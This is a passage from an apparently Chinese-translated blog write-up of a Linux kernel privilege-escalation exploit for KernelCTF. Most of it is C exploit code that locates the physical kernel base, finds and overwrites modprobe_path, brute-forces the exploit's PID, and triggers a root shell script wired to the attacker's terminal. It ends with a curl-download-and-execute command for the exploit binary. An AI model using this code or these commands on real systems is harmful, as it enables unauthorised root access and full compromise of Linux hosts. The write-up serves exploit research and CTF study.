&#123;</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> phys_kernel_base;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 检查 x64-gcc/clang 的内核代码段签名</span></span><br><span class="line">            phys_kernel_base = kernel_iteration_base + CONFIG_PHYSICAL_ALIGN * j;</span><br><span class="line"></span><br><span class="line">            PRINTF_VERBOSE(<span class="string">&quot;[*] phys kernel addr: %016llx, val: %016llx\n&quot;</span>, phys_kernel_base, *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(pmd_kernel_area + j * <span class="number">0x1000</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (is_kernel_base(pmd_kernel_area + j * <span class="number">0x1000</span>) == <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ...（漏洞的其余部分）</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] failed to find kernel code segment... TLB flush fail?\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h4 id="5-1-3-2-查找-modprobe-path"><a href="#5-1-3-2-查找-modprobe-path" class="headerlink" title="5.1.3.2 查找 modprobe_path"></a>5.1.3.2 查找 modprobe_path</h4><p>现在我们找到了物理内核基址，我们将扫描它之后的内存。为了识别 <code>modprobe_path</code>，我们扫描 <code>CONFIG_MODPROBE_PATH</code>（<code>&quot;/sbin/modprobe&quot;</code>）并用 <code>&#39;\x00&#39;</code> 填充到 <code>KMOD_PATH_LEN</code>（256）字节。如果我们找到该地址，可以通过覆盖它并检查 <code>/proc/sys/kernel/modprobe</code> 是否反映了这一变化来验证，因为它是对 <code>modprobe_path</code> 的直接引用。</p>
<p>如果启用了静态用户模式助手的缓解措施，也可以绕过它。我们将简单地搜索 <code>CONFIG_STATIC_USERMODEHELPER_PATH</code>（<code>&quot;/sbin/usermode-helper&quot;</code>）等。不幸的是，没有办法验证这是否是正确的实例，但应该只有一个匹配项。</p>
<p>然后，当找到目标时，我们将尝试覆盖它。如果失败，我们将继续扫描其他目标匹配项。</p>
<p><strong>代码块 5.1.3.2.1</strong>：部分漏洞利用函数 <code>privesc_flh_bypass_no_time()</code> 的代码，使用 C 编写，用于查找物理 <code>modprobe_path</code> 地址。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">privesc_flh_bypass_no_time</span><span class="params">(<span class="type">int</span> shell_stdin_fd, <span class="type">int</span> shell_stdout_fd)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 范围 = (k * j) * CONFIG_PHYSICAL_ALIGN</span></span><br><span class="line">    <span class="comment">// 每次迭代扫描 512 页（1 个 PTE 大小）以查找内核基址</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; (CONFIG_PHYS_MEM / (CONFIG_PHYSICAL_ALIGN * <span class="number">512</span>)); k++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> kernel_iteration_base;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ...（设置 512 个 PTE 条目）</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 每次迭代扫描 1 页（而不是 CONFIG_PHYSICAL_ALIGN）以查找内核基址</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> j = <span class="number">0</span>; j &lt; <span class="number">512</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> phys_kernel_base;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ...（查找物理内核基址）</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 从内核基址扫描 40 * 0x200000（2MiB）= 0x5000000（80MiB）字节以查找 modprobe_path。如果未找到，则搜索另一个内核基址</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">40</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="type">void</span> *pmd_modprobe_addr;</span><br><span class="line">                <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> phys_modprobe_addr;</span><br><span class="line">                <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> modprobe_iteration_base;</span><br><span class="line"></span><br><span class="line">                modprobe_iteration_base = phys_kernel_base + i * <span class="number">0x200000</span>;</span><br><span class="line"></span><br><span class="line">                PRINTF_VERBOSE(<span class="string">&quot;[*] setting physical address range to 0x%016llx - 0x%016llx\n&quot;</span>, modprobe_iteration_base, modprobe_iteration_base + <span class="number">0x200000</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 将其他线程的 PUD 数据范围页设置为内核内存</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">short</span> j = <span class="number">0</span>; j &lt; <span class="number">512</span>; j++)</span><br><span class="line">                    pte_area[<span class="number">512</span> + j] = (modprobe_iteration_base + <span class="number">0x1000</span> * j) | <span class="number">0x8000000000000867</span>;</span><br><span class="line"></span><br><span class="line">                flush_tlb(_pmd_area, <span class="number">0x400000</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> CONFIG_STATIC_USERMODEHELPER</span></span><br><span class="line">                pmd_modprobe_addr = memmem(pmd_data_area, <span class="number">0x200000</span>, CONFIG_STATIC_USERMODEHELPER_PATH, <span class="built_in">strlen</span>(CONFIG_STATIC_USERMODEHELPER_PATH));</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">                pmd_modprobe_addr = memmem_modprobe_path(pmd_data_area, <span class="number">0x200000</span>, modprobe_path, KMOD_PATH_LEN);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">                <span class="keyword">if</span> (pmd_modprobe_addr == <span class="literal">NULL</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> CONFIG_LEET</span></span><br><span class="line">                breached_the_mainframe();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">                phys_modprobe_addr = modprobe_iteration_base + (pmd_modprobe_addr - pmd_data_area);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[+] verified modprobe_path/usermodehelper_path: %016llx (&#x27;%s&#x27;)...\n&quot;</span>, phys_modprobe_addr, (<span class="type">char</span>*)pmd_modprobe_addr);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// ...（漏洞的其余部分）</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[-] failed to find correct modprobe_path: trying to find new kernel base...\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] failed to find kernel code segment... TLB flush fail?\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="5-1-4-覆盖-modprobe-path"><a href="#5-1-4-覆盖-modprobe-path" class="headerlink" title="5.1.4 覆盖 modprobe_path"></a>5.1.4 覆盖 <code>modprobe_path</code></h3><p>最后，我们现在有对 <code>modprobe_path</code> 的读写访问权限。不幸的是，还有一个最后的挑战：获取漏洞利用的“真实” PID，以便我们可以执行 <code>/proc/&lt;pid&gt;/fd</code>（包含权限提升脚本的文件描述符）。检查是否成功的部分将在下一节完成。</p>
<blockquote>
<p>即使我们使用磁盘文件，漏洞利用也需要知道 PID，因为如果我们在挂载命名空间中，我们需要使用 <code>/proc/&lt;pid&gt;/cwd</code>。当然，在实际操作中有一些方法可以绕过这个限制，比如使用内核警告消息中显示的 PID，但我想让这个漏洞利用尽可能地通用。</p>
</blockquote>
<p>如下面的代码块所示，我们将 <code>modprobe_path</code> 或静态用户模式助手字符串覆盖为 <code>&quot;/proc/&lt;pid&gt;/fd/&lt;script_fd&gt;&quot;</code>，该路径引用了权限提升脚本，这将在接下来的部分中提到。</p>
<p>请注意，权限提升脚本（包含在此代码块中）使用当前 PID 猜测的 PID 进行 shell 操作，并检查猜测是否正确。</p>
<p><strong>代码块 5.1.4.1</strong>：部分漏洞利用函数 <code>privesc_flh_bypass_no_time()</code> 的代码，用于覆盖 <code>modprobe_path</code> 内核变量。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MEMCPY_HOST_FD_PATH(buf, pid, fd) sprintf((buf), <span class="string">&quot;/proc/%u/fd/%u&quot;</span>, (pid), (fd));</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">privesc_flh_bypass_no_time</span><span class="params">(<span class="type">int</span> shell_stdin_fd, <span class="type">int</span> shell_stdout_fd)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 运行此脚本，而不是 /sbin/modprobe</span></span><br><span class="line">    <span class="type">int</span> modprobe_script_fd = memfd_create(<span class="string">&quot;&quot;</span>, MFD_CLOEXEC);</span><br><span class="line">    <span class="type">int</span> status_fd = memfd_create(<span class="string">&quot;&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 范围 = (k * j) * CONFIG_PHYSICAL_ALIGN</span></span><br><span class="line">    <span class="comment">// 每次迭代扫描 512 页（1 个 PTE 大小）以查找内核基址</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; (CONFIG_PHYS_MEM / (CONFIG_PHYSICAL_ALIGN * <span class="number">512</span>)); k++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 每次迭代扫描 1 页（而不是 CONFIG_PHYSICAL_ALIGN）以查找内核基址</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> j = <span class="number">0</span>; j &lt; <span class="number">512</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 从内核基址扫描 40 * 0x200000（2MiB）= 0x5000000（80MiB）字节以查找 modprobe_path。如果未找到，则搜索另一个内核基址</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">40</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="type">void</span> *pmd_modprobe_addr;</span><br><span class="line">                <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> phys_modprobe_addr;</span><br><span class="line">                <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> modprobe_iteration_base;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// ...（查找 modprobe_path）</span></span><br><span class="line"></span><br><span class="line">                PRINTF_VERBOSE(<span class="string">&quot;[*] modprobe_script_fd: %d, status_fd: %d\n&quot;</span>, modprobe_script_fd, status_fd);</span><br><span class="line"></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[*] overwriting path with PIDs in range 0-&gt;4194304...\n&quot;</span>);</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">pid_t</span> pid_guess = <span class="number">0</span>; pid_guess &lt; <span class="number">4194304</span>; pid_guess++)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="type">int</span> status_cnt;</span><br><span class="line">                    <span class="type">char</span> buf;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 覆盖 `modprobe_path` 内核变量为 `&quot;/proc/&lt;pid&gt;/fd/&lt;script_fd&gt;&quot;`</span></span><br><span class="line">                    MEMCPY_HOST_FD_PATH(pmd_modprobe_addr, pid_guess, modprobe_script_fd);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (pid_guess % <span class="number">50</span> == <span class="number">0</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        PRINTF_VERBOSE(<span class="string">&quot;[+] overwriting modprobe_path with different PIDs (%u-%u)...\n&quot;</span>, pid_guess, pid_guess + <span class="number">50</span>);</span><br><span class="line">                        PRINTF_VERBOSE(<span class="string">&quot;    - i.e. &#x27;%s&#x27; @ %p...\n&quot;</span>, (<span class="type">char</span>*)pmd_modprobe_addr, pmd_modprobe_addr);</span><br><span class="line">                        PRINTF_VERBOSE(<span class="string">&quot;    - matching modprobe_path scan var: &#x27;%s&#x27; @ %p)...\n&quot;</span>, modprobe_path, modprobe_path);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    lseek(modprobe_script_fd, <span class="number">0</span>, SEEK_SET); <span class="comment">// 覆盖之前的条目</span></span><br><span class="line">                    dprintf(modprobe_script_fd, <span class="string">&quot;#!/bin/sh\necho -n 1 1&gt;/proc/%u/fd/%u\n/bin/sh 0&lt;/proc/%u/fd/%u 1&gt;/proc/%u/fd/%u 2&gt;&amp;1\n&quot;</span>, pid_guess, status_fd, pid_guess, shell_stdin_fd, pid_guess, shell_stdout_fd);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// ...（漏洞的其余部分）</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[!] verified modprobe_path address does not work... CONFIG_STATIC_USERMODEHELPER enabled?\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[-] failed to find correct modprobe_path: trying to find new kernel base...\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] failed to find kernel code segment... TLB flush fail?\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="5-1-5-触发-root-shell"><a href="#5-1-5-触发-root-shell" class="headerlink" title="5.1.5 触发 root shell"></a>5.1.5 触发 root shell</h3><p>为了触发 root shell，我们通过 <code>modprobe_trigger_memfd()</code> 运行无效文件，该函数利用覆盖的 <code>modprobe_path</code>。新的 <code>modprobe_path</code> 指向下面的脚本（<code>/proc/&lt;pid&gt;/fd/&lt;fd&gt;</code>）。它将 1 写入新分配的状态文件描述符，这使得漏洞利用检测到已成功获得 root shell，并停止执行。然后，它将 shell 提供给控制台。</p>
<p>为了在不同环境中实现普遍适用的 root shell，而不做命名空间的假设并保持无文件状态，我“劫持”了漏洞利用的 stdin 和 stdout 文件描述符，并将它们转发到 root shell。这在本地机器上以及反向 shell 中均有效。实际上——在没有文件重定向功能的情况下——脚本运行如下：</p>
<p><strong>代码块 5.1.5.1</strong>：以 root 身份执行的 BASH 脚本，用于传递成功状态并向用户提供 shell。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> -n 1 &gt; /proc/&lt;exploit_pid&gt;/fd/&lt;status_fd&gt;</span><br><span class="line">/bin/sh 0&lt;/proc/&lt;exploit_pid&gt;/fd/0 1&gt;/proc/&lt;exploit_pid&gt;/fd/1 2&gt;&amp;1</span><br></pre></td></tr></table></figure></div>
<p><strong>代码块 5.1.5.2</strong>：部分漏洞利用函数 <code>privesc_flh_bypass_no_time()</code> 的代码，用于触发 <code>modprobe_path</code> 机制。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">modprobe_trigger_memfd</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">char</span> *argv_envp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    fd = memfd_create(<span class="string">&quot;&quot;</span>, MFD_CLOEXEC);</span><br><span class="line">    write(fd, <span class="string">&quot;\xff\xff\xff\xff&quot;</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    fexecve(fd, &amp;argv_envp, &amp;argv_envp);</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">privesc_flh_bypass_no_time</span><span class="params">(<span class="type">int</span> shell_stdin_fd, <span class="type">int</span> shell_stdout_fd)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 运行此脚本，而不是 /sbin/modprobe</span></span><br><span class="line">    <span class="type">int</span> modprobe_script_fd = memfd_create(<span class="string">&quot;&quot;</span>, MFD_CLOEXEC);</span><br><span class="line">    <span class="type">int</span> status_fd = memfd_create(<span class="string">&quot;&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 范围 = (k * j) * CONFIG_PHYSICAL_ALIGN</span></span><br><span class="line">    <span class="comment">// 每次迭代扫描 512 页（1 个 PTE 大小）以查找内核基址</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; (CONFIG_PHYS_MEM / (CONFIG_PHYSICAL_ALIGN * <span class="number">512</span>)); k++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 每次迭代扫描 1 页（而不是 CONFIG_PHYSICAL_ALIGN）以查找内核基址</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> j = <span class="number">0</span>; j &lt; <span class="number">512</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 从内核基址扫描 40 * 0x200000（2MiB）= 0x5000000（80MiB）字节以查找 modprobe_path。如果未找到，则搜索另一个内核基址</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">40</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">pid_t</span> pid_guess = <span class="number">0</span>; pid_guess &lt; <span class="number">65536</span>; pid_guess++)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="type">int</span> status_cnt;</span><br><span class="line">                    <span class="type">char</span> buf;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// ...（覆盖 modprobe_path）</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 通过执行具有未知 binfmt 的文件来触发 root 权限的自定义 modprobe 文件</span></span><br><span class="line">                    modprobe_trigger_memfd();</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 指示正确的 PID（和 root shell），停止进一步的暴力破解</span></span><br><span class="line">                    status_cnt = read(status_fd, &amp;buf, <span class="number">1</span>);</span><br><span class="line">                    <span class="keyword">if</span> (status_cnt == <span class="number">0</span>)</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;[+] successfully breached the mainframe as real-PID %u\n&quot;</span>, pid_guess);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[!] verified modprobe_path address does not work... CONFIG_STATIC_USERMODEHELPER enabled?\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[-] failed to find correct modprobe_path: trying to find new kernel base...\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] failed to find kernel code segment... TLB flush fail?\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="5-1-6-后利用阶段的稳定性"><a href="#5-1-6-后利用阶段的稳定性" class="headerlink" title="5.1.6 后利用阶段的稳定性"></a>5.1.6 后利用阶段的稳定性</h3><p>由于我们在内存中的一些操作，漏洞利用进程的页表页有些不稳定。幸运的是，这只在进程停止时成为问题，因此我们可以通过不让进程停止来解决。:^)</p>
<p>我们通过一个简单的 <code>sleep()</code> 调用来实现这一点，但不幸的是这会使用户的 TTY 也进入睡眠状态，因为进程在前台睡眠。为了解决这个问题，我们让漏洞利用生成一个子进程来执行实际的漏洞利用，并在父进程在逻辑上需要退出时退出。</p>
<p>此外，我们为子进程注册了 SIGINT 信号处理程序，用于处理（包括在内）键盘中断。这会使我们的子进程在后台进入睡眠状态。父进程不会受到影响，因为处理程序是在子进程中设置的。</p>
<blockquote>
<p>注意，我们不能使用 <code>wait()</code>，因为子进程会一直在后台运行。</p>
</blockquote>
<p><strong>代码块 5.1.6.1</strong>：漏洞利用函数 <code>main()</code> 的部分代码，用于设置子进程并等待漏洞利用完成。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> *exploit_status;</span><br><span class="line"></span><br><span class="line">    exploit_status = mmap(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(<span class="type">int</span>), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    *exploit_status = EXPLOIT_STAT_RUNNING;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分离程序并在成功或失败时使其在后台睡眠</span></span><br><span class="line">    <span class="keyword">if</span> (fork() == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> shell_stdin_fd;</span><br><span class="line">        <span class="type">int</span> shell_stdout_fd;</span><br><span class="line"></span><br><span class="line">        signal(SIGINT, signal_handler_sleep);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 打开 stdout 等副本，这些副本不会在重定向 stdout 时被重定向，但会打印给用户</span></span><br><span class="line">        shell_stdin_fd = dup(STDIN_FILENO);</span><br><span class="line">        shell_stdout_fd = dup(STDOUT_FILENO);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> CONFIG_REDIRECT_LOG</span></span><br><span class="line">        setup_log(<span class="string">&quot;exp.log&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">        setup_env();</span><br><span class="line"></span><br><span class="line">        privesc_flh_bypass_no_time(shell_stdin_fd, shell_stdout_fd);</span><br><span class="line"></span><br><span class="line">        *exploit_status = EXPLOIT_STAT_FINISHED;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 防止由于无效页表而崩溃</span></span><br><span class="line">        sleep(<span class="number">9999</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 防止过早退出</span></span><br><span class="line">    SPINLOCK(*exploit_status == EXPLOIT_STAT_RUNNING);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="5-1-7-运行漏洞利用"><a href="#5-1-7-运行漏洞利用" class="headerlink" title="5.1.7 运行漏洞利用"></a>5.1.7 运行漏洞利用</h3><p>对于 KernelCTF，我使用以下命令运行了漏洞利用：<code>cd /tmp &amp;&amp; curl https://secret.pwning.tech/&lt;gid&gt; -o ./exploit &amp;&amp; chmod +x ./exploit &amp;&amp; ./exploit</code>。这利用了目标机器上的可写 <code>/tmp</code> 目录。这是在我意识到我可以使用 Perl 以无文件方式执行漏洞利用之前的事情。最后，经过几个月的工作，我们终于得到了回报：</p>
